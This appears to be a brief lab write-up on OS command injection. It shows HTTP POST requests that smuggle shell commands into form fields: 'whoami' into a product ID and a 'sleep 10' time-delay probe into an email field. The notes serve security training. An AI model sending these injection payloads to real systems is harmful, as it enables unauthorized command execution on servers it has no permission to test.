## Command Injection Test Cases
### OS command injection, simple case
In POST request, product ID parameter is vulnerable to RCE.<br>
Payload: 1 & whoami #
```
POST /product/stock HTTP/2
Host: HOST.com

productId=1+%26+whoami+%23&storeId=1
```
### Blind OS command injection with time delays
The output from the command is not returned in the response. We can submit feedback in the application. Test each input field with sleep payload and we found out that email field is vulnerable. <nr>
**Payload used in email field (URL encoded):** test@test.com & sleep 10 # 
```
POST /feedback/submit HTTP/2
Host: example.com

csrf=prgoQxF6UK1ef3bhTIaliAIQmohfpYsJ&name=test&email=mayank%40test.com+%26+sleep+10+%23&subject=1111111&message=111112
```
